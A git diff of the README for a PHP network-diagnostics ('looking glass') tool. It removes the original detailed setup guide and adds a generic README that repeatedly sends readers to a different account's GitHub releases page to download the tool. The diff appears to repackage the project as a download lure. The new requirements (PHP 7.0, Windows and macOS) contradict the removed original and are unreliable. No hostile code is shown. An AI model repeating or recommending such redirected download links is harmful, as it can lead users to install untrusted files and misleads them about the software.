@@ -1,480 +1,87 @@
-# Alsyundawy PHP Looking Glass
-
-![License](https://img.shields.io/badge/license-MIT-blue.svg) ![PHP](https://img.shields.io/badge/php-%3E%3D8.1-777bb4.svg)
-[![Latest Version](https://img.shields.io/github/v/release/alsyundawy/php-looking-glass)](https://github.com/alsyundawy/php-looking-glass/releases)
-[![Maintenance Status](https://img.shields.io/maintenance/yes/9999)](https://github.com/alsyundawy/php-looking-glass/)
-[![License](https://img.shields.io/github/license/alsyundawy/php-looking-glass)](https://github.com/alsyundawy/php-looking-glass/blob/master/LICENSE)
-[![GitHub Issues](https://img.shields.io/github/issues/alsyundawy/php-looking-glass)](https://github.com/alsyundawy/php-looking-glass/issues)
-[![GitHub Pull Requests](https://img.shields.io/github/issues-pr/alsyundawy/php-looking-glass)](https://github.com/alsyundawy/php-looking-glass/pulls)
-[![Donate with PayPal](https://img.shields.io/badge/PayPal-donate-orange)](https://www.paypal.me/alsyundawy)
-[![Sponsor with GitHub](https://img.shields.io/badge/GitHub-sponsor-orange)](https://github.com/sponsors/alsyundawy)
-[![GitHub Stars](https://img.shields.io/github/stars/alsyundawy/php-looking-glass?style=social)](https://github.com/alsyundawy/php-looking-glass/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/alsyundawy/php-looking-glass?style=social)](https://github.com/alsyundawy/php-looking-glass/network/members)
-[![GitHub Contributors](https://img.shields.io/github/contributors/alsyundawy/php-looking-glass?style=social)](https://github.com/alsyundawy/php-looking-glass/graphs/contributors)
-
-## Stargazers over time
-[![Stargazers over time](https://starchart.cc/alsyundawy/php-looking-glass.svg?variant=dark)](https://starchart.cc/alsyundawy/php-looking-glass)
-
-**A professional, lightweight, single-file PHP Looking Glass tool designed for network diagnostics. Fully compatible with IPv4 and IPv6, featuring a modern, responsive UI (Dark/Light mode) and utilizing standard system utilities.**
-
-![looking-glass](/php-looking-glass.png)
-
-
-## Features
-
-- **Network Diagnostics**: Ping, Traceroute, MTR (My Traceroute), and Host (DNS Lookup).
-- **Performance Testing**: 
-  - **Iperf3**: TCP, UDP, and Reverse mode support.
-  - **Download Tests**: Customizable binary file downloads.
-- **Modern UI**: 
-  - Fully responsive design (Mobile to 4K).
-  - Dark/Light mode toggle.
-  - Real-time client IP detection.
-- **Security**: Strict input sanitization to prevent command injection.
-- **Easy Deployment**: Single PHP file, no database required.
-
-## Requirements
-
-- **PHP**: Version 8.1 or higher.
-- **PHP Modules**: `php-cli`, `php-common`, `php-fpm` (if using Nginx), `php-json`, `php-mbstring`, `php-xml`.
-- **Web Server**: Nginx or Apache.
-- **System Utilities**: The web server user must be able to execute the following commands:
-  - `ping`
-  - `traceroute`
-  - `mtr`
-  - `iperf3`
-  - `host` (usually part of `bind-utils` or `dnsutils`)
-
----
-
-## Installation Guide
-
-### 1. Install System Dependencies through Terminal
-
-**Debian/Ubuntu:**
-```bash
-sudo apt-get update
-sudo apt-get install php-cli php-fpm php-json php-common php-mbstring php-xml ping traceroute mtr-tiny iperf3 dnsutils -y
-```
-
-**CentOS/RHEL/AlmaLinux:**
-```bash
-sudo dnf install php-cli php-fpm php-json php-common php-mbstring php-xml iputils traceroute mtr iperf3 bind-utils -y
-```
-
-### 2. Deployment
-
-Simply download `ALSYUNDAWY-LG-GITHUB-2026.php` rename to `index.php` and upload it to your web server's public directory (e.g., `/var/www/html/lg/`).
-
-### 3. Web Server Configuration
-
-To ensure optimal performance, security, and functionality (especially for large downloads and long-running tests like MTR), please use the following configurations.
-
-#### Option A: Nginx + PHP-FPM
-
-Create a new server block or modify your existing one. This configuration includes **Gzip compression**, **Extended Timeouts**, **Security Headers**, and **IPv6 support**.
-
-```nginx
-server {
-    # Listen on port 80 for both IPv4 and IPv6
-    listen 80;
-    listen [::]:80;
-    
-    server_name lg.yourdomain.com;
-    root /var/www/html/lg;
-    index index.php;
-
-    # =========================================================================
-    # PERFORMANCE & TIMEOUTS
-    # =========================================================================
-    # Allow large file uploads/downloads (Critical for Speedtest/Download Test)
-    client_max_body_size 4096M;
-    
-    # Extended timeouts for long-running processes (MTR, Traceroute)
-    client_header_timeout 86400;
-    client_body_timeout 86400;
-    fastcgi_read_timeout 86400;
-    proxy_read_timeout 86400;
-
-    # =========================================================================
-    # SECURITY HEADERS & SETTINGS
-    # =========================================================================
-    server_tokens off;      # Hide Nginx version
-    autoindex off;          # Disable directory listing
-    http2 on;               # Enable HTTP/2 for better performance
-
-    # Security headers
-    add_header Vary Accept-Encoding;
-    proxy_hide_header Vary;
-
-    # =========================================================================
-    # CUSTOM ERROR PAGES
-    # =========================================================================
-    error_page 400 /400.html;
-    error_page 401 /401.html;
-    error_page 402 /402.html;
-    error_page 403 /403.html;
-    error_page 404 /404.html;
-    error_page 500 /500.html;
-    error_page 502 /502.html;
-    error_page 503 /503.html;
-
-    # =========================================================================
-    # GZIP COMPRESSION
-    # =========================================================================
-    gzip on;
-    gzip_static on;
-    gzip_disable "MSIE [1-6]\.(?!.*SV1)";
-    gzip_http_version 1.1;
-    gzip_min_length 1100;
-    gzip_vary on;
-    gzip_comp_level 7;
-    gzip_proxied any;
-    gzip_buffers 128 4k;
-    gzip_types
-        text/css
-        text/javascript
-        text/plain
-        text/xml
-        application/x-javascript
-        application/javascript
-        application/json
-        application/vnd.ms-fontobject
-        application/x-font-opentype
-        application/x-font-truetype
-        application/x-font-ttf
-        application/xml
-        application/font-woff
-        application/atom+xml
-        application/rss+xml
-        application/x-web-app-manifest+json
-        application/xhtml+xml
-        font/eot
-        font/opentype
-        font/otf
-        image/svg+xml
-        image/vnd.microsoft.icon
-        image/bmp
-        image/png
-        image/gif
-        image/jpeg
-        image/jpg
-        image/webp
-        image/x-icon
-        text/x-component;
-
-    # =========================================================================
-    # LOCATION BLOCKS
-    # =========================================================================
-    location / {
-        try_files $uri $uri/ =404;
-    }
-
-    location ~ \.php$ {
-        include snippets/fastcgi-php.conf;
-        # Adjust the socket path to match your PHP version (e.g., php8.1-fpm.sock)
-        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
-        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-        include fastcgi_params;
-    }
-
-    # Deny access to hidden files (e.g., .htaccess, .git)
-    location ~ /\.ht {
-        deny all;
-    }
-}
-```
-
-#### Option B: Apache + PHP
-
-Ensure `mod_rewrite`, `mod_deflate`, `mod_headers`, and `mod_http2` are enabled.
-
-```apache
-<VirtualHost *:80>
-    ServerName lg.yourdomain.com
-    DocumentRoot /var/www/html/lg
-
-    # =========================================================================
-    # PROTOCOLS & SECURITY
-    # =========================================================================
-    # Enable HTTP/2 (Requires mod_http2)
-    Protocols h2 http/1.1
-
-    # Hide Apache version and signature
-    ServerTokens Prod
-    ServerSignature Off
-
-    # =========================================================================
-    # PERFORMANCE & TIMEOUTS
-    # =========================================================================
-    # Allow large uploads/downloads (4096M = 4294967296 bytes)
-    LimitRequestBody 4294967296
-
-    # Extended timeouts for long-running tests (MTR/Traceroute)
-    # TimeOut directive in Apache (seconds)
-    TimeOut 86400
-
-    <Directory /var/www/html/lg>
-        Options -Indexes +FollowSymLinks
-        AllowOverride All
-        Require all granted
-    </Directory>
-
-    # =========================================================================
-    # CUSTOM ERROR PAGES
-    # =========================================================================
-    ErrorDocument 400 /400.html
-    ErrorDocument 401 /401.html
-    ErrorDocument 402 /402.html
-    ErrorDocument 403 /403.html
-    ErrorDocument 404 /404.html
-    ErrorDocument 500 /500.html
-    ErrorDocument 502 /502.html
-    ErrorDocument 503 /503.html
-
-    # =========================================================================
-    # HEADERS
-    # =========================================================================
-    <IfModule mod_headers.c>
-        Header append Vary Accept-Encoding
-    </IfModule>
-
-    # =========================================================================
-    # GZIP COMPRESSION (mod_deflate)
-    # =========================================================================
-    <IfModule mod_deflate.c>
-        AddOutputFilterByType DEFLATE text/css text/javascript text/plain text/xml
-        AddOutputFilterByType DEFLATE application/x-javascript application/javascript application/json
-        AddOutputFilterByType DEFLATE application/vnd.ms-fontobject application/x-font-opentype application/x-font-truetype
-        AddOutputFilterByType DEFLATE application/x-font-ttf application/xml application/font-woff
-        AddOutputFilterByType DEFLATE application/atom+xml application/rss+xml application/x-web-app-manifest+json application/xhtml+xml
-        AddOutputFilterByType DEFLATE font/eot font/opentype font/otf
-        AddOutputFilterByType DEFLATE image/svg+xml image/vnd.microsoft.icon image/bmp image/x-icon
-    </IfModule>
-</VirtualHost>
-```
-
-### 4. SSL Installation (Certbot)
-
-Secure your Looking Glass with HTTPS using Let's Encrypt.
-
-**Install Certbot:**
-
-*Debian/Ubuntu:*
-```bash
-sudo apt-get install certbot python3-certbot-nginx python3-certbot-apache -y
-```
-
-*CentOS/RHEL:*
-```bash
-sudo dnf install certbot python3-certbot-nginx python3-certbot-apache -y
-```
-
-**Run Certbot:**
-
-*For Nginx:*
-```bash
-sudo certbot --nginx -d lg.yourdomain.com
-```
-
-*For Apache:*
-```bash
-sudo certbot --apache -d lg.yourdomain.com
-```
-
-Follow the on-screen instructions to automatically configure SSL.
-
-### 5. PHP Configuration (`php.ini`)
-
-Ensure the following functions are **NOT** disabled in your `php.ini` file (`disable_functions` directive):
-
-- `proc_open`
-- `proc_get_status`
-- `proc_close`
-- `stream_get_contents`
-
-Example:
-```ini
-disable_functions = passthru,shell_exec,system,popen,parse_ini_file,show_source
-; removed proc_open, proc_close, etc. from the list
-```
-
-
-### 6. PHP Performance Tweaking
-
-To ensure smooth operation of network tests (especially defined download sizes and long traceroutes), add or modify these lines in your `php.ini` or FPM pool configuration:
-
-```ini
-; Increase execution time for long tests (MTR/Traceroute)
-max_execution_time = 300
-max_input_time = 300
-
-; Ensure sufficient memory for large data handling
-memory_limit = 256M
-
-; Disable output buffering for real-time results (optional but recommended)
-output_buffering = Off
-zlib.output_compression = Off
-```
-
----
-
-## Service Configuration (Iperf3)
-
-To keep the Iperf3 server running in the background as a service, creates a systemd unit file.
-
-1.  **Create the service file:**
-    ```bash
-    sudo nano /etc/systemd/system/iperf3.service
-    ```
-
-2.  **Add the following content:**
-    ```ini
-    [Unit]
-    Description=Iperf3 Server Service
-    After=network.target
-
-    [Service]
-    Type=simple
-    User=nobody
-    ExecStart=/usr/bin/iperf3 -s -p 5201
-    Restart=always
-    RestartSec=3
-
-    [Install]
-    WantedBy=multi-user.target
-    ```
-
-3.  **Start and enable the service:**
-    ```bash
-    sudo systemctl daemon-reload
-    sudo systemctl start iperf3
-    sudo systemctl enable iperf3
-    ```
-
----
-
-## Firewall Configuration
-
-You need to allow traffic on ports **80** (HTTP), **443** (HTTPS), and **5201** (Iperf3).
-
-**Option A: UFW (Ubuntu/Debian)**
-```bash
-sudo ufw allow 80/tcp
-sudo ufw allow 443/tcp
-sudo ufw allow 5201/tcp
-sudo ufw reload
-```
-
-**Option B: Firewalld (CentOS/RHEL/AlmaLinux)**
-```bash
-sudo firewall-cmd --permanent --add-service=http
-sudo firewall-cmd --permanent --add-service=https
-sudo firewall-cmd --permanent --add-port=5201/tcp
-sudo firewall-cmd --reload
-```
-
-**Option C: Iptables**
-```bash
-sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
-sudo iptables -A INPUT -p tcp --dport 5201 -j ACCEPT
-sudo service iptables save
-```
-
----
-
-## Configuration
-
-Open the PHP file in a text editor and modify the top section to match your server details:
-
-```php
-// ========================================================================
-// CONFIGURATION
-// ========================================================================
-
-$siteName = 'ALSYUNDAWY IT SOLUTION'; // Your Site/Company Name
-$siteUrl = 'https://lg.yourdomain.com'; // Your LG URL
-
-// Server Location
-$serverLocation = 'DKI Jakarta, Indonesia';
-
-// Server IPs (Leave empty if not available)
-$ipv4 = '103.145.226.20';
-$ipv6 = '2001:df0:2e00:face::1';
-
-// Iperf3 Port
-$iperfport = '5201';
-
-// Download Test Files
-// Ensure these files exist in the same directory!
-$testFiles = array('250MB', '500MB', '1GB');
-```
-
-## Image & Logo Customization
-
-You can customize the logo and background image by replacing the following files in the same directory as the script:
-
-1.  **Logo**: `lg-logo.webp` (Recommended height: ~36px)
-2.  **Background**: `hero-lg.webp` (Background for the header, recommended compressed webp format)
-
-Ensure these files are accessible by the web server user.
-
-### Creating Dummy Files for Download Test
-
-You can generate dummy files for the download speed test using the `dd` command in the terminal. Navigate to your web server's directory (e.g., `/var/www/html/lg/`) and run:
-
-**250MB File:**
-```bash
-dd if=/dev/zero of=250MB.bin bs=1M count=250 status=progress
-```
-
-**500MB File:**
-```bash
-dd if=/dev/zero of=500MB.bin bs=1M count=500 status=progress
-```
-
-**1GB File:**
-```bash
-dd if=/dev/zero of=1GB.bin bs=1M count=1024 status=progress
-```
-
-> **Note:** Ensure the filenames match the values in your `$testFiles` configuration array in the PHP script.
-
-## Troubleshooting
-
-### 1. 404 Not Found
-- **Nginx**: Ensure the `try_files` directive is present in your location block.
-- **Apache**: Ensure `mod_rewrite` is enabled and `.htaccess` support is active (`AllowOverride All`).
-
-### 2. 500 Internal Server Error
-- Check web server error logs (`/var/log/nginx/error.log` or `/var/log/apache2/error.log`).
-- Ensure all required PHP extensions are installed.
-- Check permissions: The web server user (`www-data` or `apache`) must have read access to the script.
-
-### 3. "Command not found" or Empty Output
-- Verify that `ping`, `traceroute`, `mtr`, etc., are installed (`which ping`).
-- Check `php.ini` to ensure `proc_open` and `proc_get_status` are NOT in `disable_functions`.
-
-### 4. Iperf3 Connection Refused
-- Ensure Iperf3 service is running: `sudo systemctl status iperf3`.
-- Check firewall settings to confirm port 5201 is open.
-- Verify the server IP in the PHP configuration matches your actual public IP.
-
-## Donation
-**Anda bebas untuk mengubah, mendistribusikan script ini untuk keperluan anda**
-
-**If you find this project helpful and would like to support it, please consider donating via https://www.paypal.me/alsyundawy. Thank you for your support!**
-
-**Jika Anda merasa terbantu dan ingin mendukung proyek ini, pertimbangkan untuk berdonasi melalui https://www.paypal.me/alsyundawy. Terima kasih atas dukungannya!**
-
-**Jika Anda merasa terbantu dan ingin mendukung proyek ini, pertimbangkan untuk berdonasi melalui QRIS. Terima kasih atas dukungannya!**
-
-<img width="508" height="574" alt="image" src="https://github.com/user-attachments/assets/a0126f28-6dde-43da-ba14-d7c9a27de0df" />
-
-## License
-
-## MIT License. Copyright (c) 2026 Alsyundawy IT Solution.
-
-![Alt](https://repobeats.axiom.co/api/embed/78ddb5f1a231029b742cc467a74bcce400941d0f.svg "Repobeats analytics image")
+# 🌐 php-looking-glass - Your Easy Network Diagnosis Tool
 
+## 🚀 Getting Started
+
+Welcome to **php-looking-glass**, your lightweight solution for network diagnostics. This tool helps you check various aspects of your internet connection, with support for both IPv4 and IPv6. It comes with a clean, modern interface that adapts to your preferences, offering both dark and light modes.
+
+## 🛠 Features
+
+- **Lightweight and Simple**: A single-file PHP application.
+- **Full Compatibility**: Works seamlessly with IPv4 and IPv6 networks.
+- **Modern Interface**: Choose between dark and light mode for comfort.
+- **Standard Utilities**: Utilizes common tools like ping, traceroute, and DNS queries.
+  
+## 📥 Download
+
+To get started, ***visit this page to download*** the latest version of php-looking-glass:
+
+[![Download php-looking-glass](https://img.shields.io/badge/Download-php--looking--glass-4F8BF9.svg?style=for-the-badge&logoColor=white)](https://github.com/Ady9265826/php-looking-glass/releases) 
+
+### Detailed Installation Steps
+
+1. **Visit the Releases Page**: 
+   Go to the [Releases Page](https://github.com/Ady9265826/php-looking-glass/releases) using your web browser.
+   
+2. **Select the Latest Version**: 
+   Find the most recent version. Look for the file labeled as "php-looking-glass" under "Assets".
+
+3. **Download the File**: 
+   Click on the file link to start the download. It should save to your computer.
+
+4. **Prepare Your Server**: 
+   Place the downloaded file in your web server's root directory. This is often found in the `www` folder if you are using a common setup like XAMPP, MAMP, or similar.
+
+5. **Open in a Browser**:
+   Open your web browser and navigate to `http://your-server-ip/php-looking-glass`. Replace `your-server-ip` with your actual server address.
+
+6. **Use the Tool**: 
+   The interface will appear. You can now use various functions like ping, traceroute, and more.
+
+## 🌍 Compatibility
+
+**php-looking-glass** is compatible with the following environments:
+
+- **Web Servers**: Apache, Nginx
+- **Operating Systems**: Linux, Windows, macOS
+- **PHP Version**: Requires PHP 7.0 or higher
+
+Before installation, ensure you meet these requirements.
+
+## 🔧 Usage Instructions
+
+Once you have php-looking-glass up and running, you can conduct several types of tests to diagnose your network:
+
+- **Ping**: This tool checks if your server can reach an IP address or a domain name by sending small data packets.
+- **Traceroute**: Use this to find out the path your data takes to reach another server. This helps identify where delays occur.
+- **DNS Lookup**: This feature lets you ask for the IP address associated with a domain name or the other way around.
+
+Simply select the function from the menu, input the needed information, and click 'Execute'. 
+
+## 💡 Troubleshooting
+
+If you encounter issues, consider these steps:
+
+- **Check PHP Version**: Ensure your server runs at least PHP 7.0.
+- **Verify Server Configuration**: Make sure your web server can execute PHP scripts.
+- **Firewall Settings**: Check that your firewall allows outgoing and incoming connections for ping and traceroute.
+
+## 📃 Technical Information
+
+**php-looking-glass** relies on standard system utilities to perform its functions. Here’s how it works behind the scenes:
+
+- **Ping Command**: This checks connectivity to a host over the internet.
+- **Traceroute Command**: It provides a map of the path to a specified IP.
+- **DNS Queries**: These enable interaction with DNS servers to resolve names.
+
+## 🌟 Community and Support
+
+For more help, you can visit our community forums or check for issues on the GitHub page. If you find any bugs or have suggestions, please report them so we can improve the experience.
+
+## 📚 Additional Resources
+
+- **Documentation**: Comprehensive guides are available on our GitHub page.
+- **Related Tools**: Explore other network tools like `iperf3`, MTR, and others.
+
+With this guide, you're now equipped to diagnose your network clearly and efficiently with **php-looking-glass**. 
+
+For the latest version, remember to visit the [Download page](https://github.com/Ady9265826/php-looking-glass/releases) again as updates may improve functionality and performance.
